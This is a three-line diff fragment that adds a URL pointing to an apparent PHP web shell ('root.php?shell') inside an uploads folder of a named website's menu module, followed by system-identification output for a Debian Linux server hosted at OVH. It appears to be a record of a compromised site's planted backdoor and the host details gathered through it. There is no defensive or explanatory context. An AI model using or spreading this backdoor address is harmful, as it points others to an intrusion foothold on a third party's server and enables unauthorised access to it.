@@ -1,0 +1,3 @@
+http://dlagryzoni.pl/modules/fieldvmegamenu/uploads/root.php?shell
+Linux vps580065.ovh.net 3.16.0-5-amd64 #1 SMP Debian 3.16.51-3+deb8u1 (2018-01-08) x86_64
+
